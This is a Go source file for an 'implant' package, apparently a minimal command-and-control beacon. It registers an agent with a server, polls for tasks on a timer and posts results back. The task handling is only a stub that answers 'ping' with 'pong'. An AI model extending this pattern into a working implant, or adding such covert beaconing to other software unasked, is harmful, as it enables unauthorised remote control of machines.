package implant

import (
	"encoding/json"
	"io"
	"net/http"
	"strings"
	"time"
)

type Config struct {
	Server   string
	Key      string
	AgentID  string
	Interval int
}

type Task struct {
	ID      string                 `json:"id"`
	AgentID string                 `json:"agent_id"`
	Type    string                 `json:"type"`
	Payload map[string]interface{} `json:"payload"`
}

type Result struct {
	TaskID  string                 `json:"task_id"`
	AgentID string                 `json:"agent_id"`
	Output  map[string]interface{} `json:"output"`
	Status  string                 `json:"status"`
}

type Beacon struct {
	Config Config
	Client http.Client
}

func NewBeacon(cfg Config) *Beacon {
	return &Beacon{
		Config: cfg,
		Client: http.Client{Timeout: 10 * time.Second},
	}
}

func (b *Beacon) Register() error {
	agent := map[string]string{"id": b.Config.AgentID, "hostname": "agent-host", "os": "linux"}
	data, _ := json.Marshal(agent)
	req, _ := http.NewRequest("POST", b.Config.Server+"/api/v1/register", strings.NewReader(string(data)))
	req.Header.Set("Authorization", "Bearer "+b.Config.Key)
	resp, err := b.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (b *Beacon) FetchTasks() ([]Task, error) {
	req, _ := http.NewRequest("GET", b.Config.Server+"/api/v1/tasks?agent_id="+b.Config.AgentID, nil)
	req.Header.Set("Authorization", "Bearer "+b.Config.Key)
	resp, err := b.Client.Do(req)
	if err != nil {
		return []Task{}, err
	}
	defer resp.Body.Close()
	body, _ := io.ReadAll(resp.Body)
	var tasks []Task
	json.Unmarshal(body, &tasks)
	return tasks, nil
}

func (b *Beacon) SendResult(taskID string, output map[string]interface{}) error {
	result := Result{TaskID: taskID, AgentID: b.Config.AgentID, Output: output, Status: "done"}
	data, _ := json.Marshal(result)
	req, _ := http.NewRequest("POST", b.Config.Server+"/api/v1/results", strings.NewReader(string(data)))
	req.Header.Set("Authorization", "Bearer "+b.Config.Key)
	resp, err := b.Client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	return nil
}

func (b *Beacon) Run() {
	for {
		tasks, err := b.FetchTasks()
		if err != nil {
			time.Sleep(5 * time.Second)
			continue
		}
		for _, t := range tasks {
			output := map[string]interface{}{"status": "executed", "task_id": t.ID}
			if t.Type == "ping" {
				output["result"] = "pong"
			}
			_ = b.SendResult(t.ID, output)
		}
		time.Sleep(time.Duration(b.Config.Interval) * time.Second)
	}
}
